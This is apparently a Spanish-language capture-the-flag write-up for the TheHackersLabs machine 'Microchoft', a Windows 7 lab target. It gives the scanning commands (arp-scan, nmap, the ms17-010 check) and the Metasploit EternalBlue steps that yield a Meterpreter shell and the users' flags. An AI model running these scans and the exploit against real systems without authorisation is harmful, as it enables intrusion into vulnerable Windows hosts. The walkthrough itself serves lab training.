# Microchoft TheHackersLabs

***

## 1 - Reconocimiento

#### P1 - Averiguar la ip de la maquina victima

> Usando la herramienta arp-scan podemos escanear nuestra red para ver todas las ip con las q tenemos conectividad, con ayuda de el comando ping podemos saber si una maquina es windows o linux mirando el TTL (windows -> 128, linux -> 64), en este caso como la maquina victima es windows y es la unica maquina windows de mi red es fácil de identificar

```Shell
arp-scan -I eth0 --localnet
```

<figure><img src="../.gitbook/assets/Microchoft - Descubrimiento de hosts (1).jpg" alt=""><figcaption></figcaption></figure>

#### P2 - Escaneo de puertos con nmap

```Shell
nmap -p- --open --min-rate=5000 -sS -n -Pn 192.168.0.20
```

<figure><img src="../.gitbook/assets/Microchoft - Nmap.jpg" alt=""><figcaption></figcaption></figure>

## 2 - Enumeración

#### P1 - Scripts basicos de reconocimiento y versiones de los servicios

```Shell
nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 192.168.0.20
```

<figure><img src="../.gitbook/assets/Microchoft - Versiones de servicios, Scripts.jpg" alt=""><figcaption></figcaption></figure>

> Vemos que nos estamos enfrentando a un windows 7, asi que posiblemente sea vulnerable a eternal blue, vamos a comprobarlo

```Shell
nmap -p445 --script smb-vuln-ms17-010 192.168.0.20
```

<figure><img src="../.gitbook/assets/Microchoft - script de nmap eternalblue.jpg" alt=""><figcaption></figcaption></figure>

> Vemos que si es vulnerable, en el siguiente paso veremos como explotar esta vulnerabilidad con metasploit

## 3 - Explotación

#### P1 - Uso de metasploit para explotar eternalblue

> Dentro de msfconsole buscamos eternal blue

```Shell
search eternalblue
```

<figure><img src="../.gitbook/assets/Microchoft - Eternalblue.jpg" alt=""><figcaption></figcaption></figure>

> Para elegir el payload simplemente tenemos que usar el comando use seguido de el id del payload que queramos elegir en este caso el 0

```Shell
use 0
```

<figure><img src="../.gitbook/assets/Microchoft - use 0.jpg" alt=""><figcaption></figcaption></figure>

> Una vez elegido el payload, con el comando show options podemos listar la informacion que necesita el exploit para poder ser ejecutado correctamente

```Shell
show options
```

<figure><img src="../.gitbook/assets/Microchoft - show options.jpg" alt=""><figcaption></figcaption></figure>

> Indicamos la ip de la maquina victima con el comando set RHOSTS

```Shell
set RHOSTS 192.168.0.20
```

<figure><img src="../.gitbook/assets/Microchoft - Set rhosts.jpg" alt=""><figcaption></figcaption></figure>

> Con el comando run lanzamos el exploit y vemos que obtenemos una shell meterpreter

<figure><img src="../.gitbook/assets/Microchoft - meterpreter.jpg" alt=""><figcaption></figcaption></figure>

## 4 - Escalada de privilegios

#### P1 - Recolección de flags

> En esta maquina no hay escalada de privilegios, las flags estan en los escritorios de cada usuario

<figure><img src="../.gitbook/assets/Microchoft - ls users.jpg" alt=""><figcaption></figcaption></figure>

> flag de Lola

<figure><img src="../.gitbook/assets/Microchoft - flag lola.jpg" alt=""><figcaption></figcaption></figure>

> flag de Admin

<figure><img src="../.gitbook/assets/Microchoft - flag admin.jpg" alt=""><figcaption></figcaption></figure>

***
